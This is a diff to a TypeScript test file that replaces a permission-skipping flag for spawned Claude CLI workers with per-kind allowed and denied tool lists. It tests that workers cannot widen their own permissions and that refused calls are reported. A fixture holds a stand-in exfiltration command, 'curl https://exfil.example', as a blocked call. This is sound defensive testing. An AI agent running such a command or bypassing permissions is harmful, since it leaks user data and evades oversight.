@@ -14,7 +14,20 @@ import {
   truncate,
   isAuthFailureText,
   diagnoseFailureText,
+  WORKER_FLAG,
+  WORKER_KINDS,
+  PERMISSION_BLOCKED_PREFIX,
+  permissionDenials,
 } from '@/lib/spawnFormat'
+
+// The capability table main expands the marker with (scripts/lib/
+// worker-capabilities.mjs). A variable path keeps tsc from resolving the .mjs.
+const CAPS_PATH = '../../../scripts/lib/worker-capabilities.mjs'
+interface CapsModule {
+  WORKER_KINDS: string[]
+  expandWorkerArgs: (args: string[], opts?: { tmpdirs?: string[] }) => string[]
+}
+const loadCaps = () => import(CAPS_PATH) as Promise<CapsModule>
 
 // Compact JSONL event builders so each test reads as the event it exercises,
 // not as a wall of JSON.
@@ -23,16 +36,47 @@ const assistant = (...content: object[]) => ev({ type: 'assistant', message: { c
 
 // ─── claudeArgs ──────────────────────────────────────────────────────────────
 
-test('claudeArgs builds the non-interactive flag set and appends the batch suffix', () => {
-  const args = claudeArgs('/career-ops scan', 'sonnet')
+test('claudeArgs names the worker kind and appends the batch suffix', () => {
+  const args = claudeArgs('/career-ops scan', 'sonnet', 'scan')
   assert.deepEqual(args, [
-    '--dangerously-skip-permissions',
+    WORKER_FLAG, 'scan',
     '--output-format', 'stream-json',
     '--verbose',
     '--model', 'sonnet',
     '-p',
     '/career-ops scan' + NON_INTERACTIVE_SUFFIX,
   ])
+  assert.ok(!args.some(a => a.includes('skip-permissions')))
+})
+
+test('every frontend worker kind is a kind of the capability table', async () => {
+  const caps = await loadCaps()
+  assert.deepEqual([...WORKER_KINDS].sort(), [...caps.WORKER_KINDS].sort())
+})
+
+test('main expands each kind into its derived flags (dontAsk for unattended kinds, acceptEdits for chat)', async () => {
+  const caps = await loadCaps()
+  for (const kind of WORKER_KINDS) {
+    const argv = caps.expandWorkerArgs(claudeArgs('/x', 'sonnet', kind))
+    assert.deepEqual(argv.slice(0, 2), ['--permission-mode', kind === 'chat' ? 'acceptEdits' : 'dontAsk'], kind)
+    assert.ok(argv.includes('--allowedTools') && argv.includes('--disallowedTools'), kind)
+    assert.ok(!argv.includes(WORKER_FLAG), kind)
+    assert.equal(argv.at(-1), '/x' + NON_INTERACTIVE_SUFFIX, kind)
+  }
+  // The Full scan: scan.mjs and the pipeline inbox, nothing in user/ beyond portals.
+  const scan = caps.expandWorkerArgs(claudeArgs('/career-ops scan', 'sonnet', 'scan'))
+  const allowed = scan.slice(scan.indexOf('--allowedTools'), scan.indexOf('--disallowedTools'))
+  const denied = scan.slice(scan.indexOf('--disallowedTools'))
+  assert.ok(allowed.includes('Bash(node scripts/scan.mjs:*)'))
+  assert.ok(allowed.includes('Edit(./data/pipeline.md)'))
+  assert.ok(allowed.includes('Edit(./user/portals.yml)'))
+  assert.ok(!allowed.includes('Edit(./user/cv.md)') && denied.includes('Edit(./user/cv.md)'))
+})
+
+test('a renderer argv cannot widen its own permissions', async () => {
+  const caps = await loadCaps()
+  assert.throws(() => caps.expandWorkerArgs(['--dangerously-skip-permissions', '-p', 'x']))
+  assert.throws(() => caps.expandWorkerArgs([...claudeArgs('/x', 'sonnet', 'chat'), '--allowedTools', 'Bash']))
 })
 
 // Auto-latest is the default: no tier is pinned, so every spawn hands the CLI
@@ -42,7 +86,7 @@ test('MODEL_PINS is empty by default — every tier tracks the latest model', ()
 })
 
 test('claudeArgs omits --model entirely when no model is given', () => {
-  const args = claudeArgs('/career-ops pipeline')
+  const args = claudeArgs('/career-ops pipeline', undefined, 'eval-app')
   assert.equal(args.includes('--model'), false)
   // -p is the second-to-last token; the prompt is last.
   assert.equal(args[args.length - 2], '-p')
@@ -52,7 +96,7 @@ test('claudeArgs omits --model entirely when no model is given', () => {
 
 test('claudeArgs passes each tier alias through modelArg', () => {
   for (const m of ['sonnet', 'opus', 'haiku'] as const) {
-    const args = claudeArgs('/x', m)
+    const args = claudeArgs('/x', m, 'chat')
     assert.equal(args[args.indexOf('--model') + 1], modelArg(m))
     assert.equal(modelArg(m), m)
   }
@@ -249,4 +293,23 @@ test('diagnoseFailureText prefers auth over a co-occurring rate-limit signal', (
     diagnoseFailureText('429 too many requests\nauthentication_error: token expired'),
     'Claude session expired — sign in again to retry.',
   )
+})
+
+// ─── Permission denials ──────────────────────────────────────────────────────
+
+test('a result with refused calls renders the blocked capstone, not Done', () => {
+  const line = humanizeJsonlLine(ev({
+    type: 'result', subtype: 'success',
+    permission_denials: [
+      { tool_name: 'Write', tool_input: { file_path: '/repo/user/cv.md' } },
+      { tool_name: 'Bash', tool_input: { command: 'curl https://exfil.example' } },
+    ],
+  }))
+  assert.equal(line, `${PERMISSION_BLOCKED_PREFIX} Write: /repo/user/cv.md; Bash: curl https://exfil.example`)
+  assert.equal(diagnoseFailureText(line ?? ''), 'The run tried something outside its permissions and was stopped — see its last line.')
+})
+
+test('a result with an empty denial list is a normal capstone', () => {
+  assert.equal(humanizeJsonlLine(ev({ type: 'result', subtype: 'success', permission_denials: [] })), '✓ Done')
+  assert.deepEqual(permissionDenials({ type: 'result' }), [])
 })
